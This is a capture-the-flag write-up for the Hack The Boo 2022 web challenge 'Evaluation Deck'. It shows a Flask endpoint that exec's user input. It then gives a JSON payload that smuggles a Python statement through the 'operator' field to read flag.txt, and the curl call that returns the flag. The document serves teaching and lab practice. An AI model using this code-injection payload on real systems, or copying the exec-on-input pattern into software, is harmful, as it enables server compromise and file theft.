# Hack The Boo 2022

## Evaluation Deck

> A powerful demon has sent one of his ghost generals into our world to ruin the fun of Halloween. The ghost can only be defeated by luck. Are you lucky enough to draw the right cards to defeat him and save this Halloween?
>
>  Author: N/A
>
> [`web_evaluation_deck.zip`](web_evaluation_deck.zip)

Tags: _web_

## Preparation
The website is basically a pretty simple card game, there's not too much to be found on the actual page so next up is inspection of what *web_evaluation_deck.zip* contains. Alongside docker remnants there is the actual code of the web app. Browsing the code leads to an interesting endpoint ```api/get_health```.

```python
@api.route('/get_health', methods=['POST'])
def count():
    if not request.is_json:
        return response('Invalid JSON!'), 400

    data = request.get_json()

    current_health = data.get('current_health')
    attack_power = data.get('attack_power')
    operator = data.get('operator')

    if not current_health or not attack_power or not operator:
        return response('All fields are required!'), 400

    result = {}
    try:
        code = compile(f'result = {int(current_health)} {operator} {int(attack_power)}', '<string>', 'exec')
        exec(code, result)
        return response(result.get('result'))
    except:
        return response('Something Went Wrong!'), 500
```

The game code calls this endpoint for health calculation, but the interesting bit is in the ```compile``` and ```exec``` part at the end of the function. This looks like code execution could be possible here. 

## Crafting the Payload
To call this endpoint curl (or likewise) can be used. For the payload, it's clearly visible in the python code, but the frontend can also be used as reference. There's a short JavaScript snipped that shows what the endpoint expects:

```javascript
fetch('/api/get_health',{
      method:'POST',
      headers: {
         'Content-Type': 'application/json'
      },
      body: JSON.stringify({ 'current_health': health.toString(), 'attack_power': power, 'operator': operator })
   })
```

So basically a small *Json* containing three values:

```json
{
        "current_health":"100",
        "attack_power":"58",
        "operator":"-"
}
```

Calling the endpoint with this payload will generate the following code and leads the the expected result of *{"message": 42}*

```python
result = int(100) - int(58)
```

```
$ curl -X POST http://206.189.117.93:30093/api/get_health -H 'Content-Type: application/json' -d @payload.txt
{"message":42}
```

Another thing to note is that *flag.txt* is located at the root folder of the page. So what could be tried is to craft a payload that just reads the file and assignes the value to *result*. To achieve this the one line statement can be separated with ";" in python. The final result should look something like

```python
result = int(current_health); result = <read file here>; int(attack_power)
```

So the final payload looks like this

```json
{
        "current_health":"100",
        "attack_power":"42",
        "operator":"; result = open('../flag.txt').read(); "
}
```

Calling the endpoint again with this payload leads the flag

```
$ curl -X POST http://206.189.117.93:30093/api/get_health -H 'Content-Type: application/json' -d @payload.txt
{"message":"HTB{c0d3_1nj3ct10ns_4r3_Gr3at!!}"}
```